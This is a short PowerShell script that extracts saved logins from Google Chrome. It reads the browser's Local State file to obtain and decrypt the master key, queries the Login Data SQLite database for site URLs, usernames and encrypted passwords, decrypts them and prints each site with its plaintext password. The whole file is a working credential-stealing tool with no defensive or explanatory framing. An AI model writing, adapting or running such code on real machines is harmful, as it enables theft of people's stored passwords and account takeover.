Import-Module .\decryption.ps1 -Force

# Load SQLite assembly
# Invoke-WebRequest -Uri "http://system.data.sqlite.org/blobs/1.0.113.0/sqlite-netFx45-binary-x64-2012-1.0.113.0.zip" -OutFile $env:temp\sqlite.zip
# mkdir $env:temp\sqlite.net
# Expand-Archive $env:temp\sqlite.zip -DestinationPath $env:temp\sqlite.net


Add-Type -Path "$env:temp\sqlite.net\System.Data.SQLite.dll"


$ChromeLocalStatePath =  "$env:USERPROFILE\appdata\local\Google\Chrome\User Data\Local State"
$ChromeDefaultCreds = "$env:USERPROFILE\appdata\local\Google\Chrome\User Data\Default\Login Data"

$localStateContent = Get-Content -Path $ChromeLocalStatePath -Raw


$localStateData = $localStateContent | ConvertFrom-Json


# Retrieve the key
$crypt = $localStateData.os_crypt.encrypted_key



$key =  Get-EncData -password $crypt

# Open the SQLite database
$sqlQuery = "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created"

# Execute the query
$connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList "Data Source=$ChromeDefaultCreds"
$connection.Open()

# Execute the SQL query
$command = $connection.CreateCommand()
$command.CommandText = $sqlQuery
$reader = $command.ExecuteReader()

# Convert query results to JSON
while ($reader.Read()) {
    # Access data using reader.GetValue() or reader["ColumnName"]
    try {
            $value = $reader.GetValue(0)
        $pass = $reader.GetValue(3)
        $all = Get-DecryptPassword -AesKey $key -Password $pass 
        Write-Host "Key: $value, Pass: $all"
    }
    catch {
        <#Do this if a terminating exception happens#>
        $connection.Close()
        $connection.Dispose()
    }

}

# Close the database connection
$connection.Close()
$connection.Dispose()